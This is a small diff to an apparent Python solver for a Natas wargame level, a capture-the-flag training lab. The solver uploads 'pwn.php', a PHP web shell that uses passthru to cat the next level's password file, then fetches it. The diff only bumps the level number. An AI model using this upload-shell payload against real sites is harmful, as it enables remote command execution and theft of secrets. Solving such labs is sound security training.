@@ -18,7 +18,7 @@ def solve(url: str, login: LevelLogin) -> Optional[str]:
         "filename": "pwn.php",
     }
     payload = {
-        "uploadedfile": f"<? passthru('cat {NATAS_DATA['flag_path']}natas{LEVEL}'); ?>",
+        "uploadedfile": f"<? passthru('cat {NATAS_DATA['flag_path']}natas{LEVEL + 1}'); ?>",
     }
     response = requests.post(url, auth=login, data=data, files=payload)
     response.raise_for_status()
@@ -29,7 +29,7 @@ def solve(url: str, login: LevelLogin) -> Optional[str]:
     response = requests.get(f"{url}/{uploaded_payload_path}", auth=login)
 
     # the flag _should_ be the only text in the response, but test it to be sure
-    return try_level_login(LEVEL, extract_candidate_passwords(response.text, in_html_body=False))
+    return try_level_login(LEVEL + 1, extract_candidate_passwords(response.text, in_html_body=False))
 
 if __name__ == "__main__":
     url, login = load_level(LEVEL)
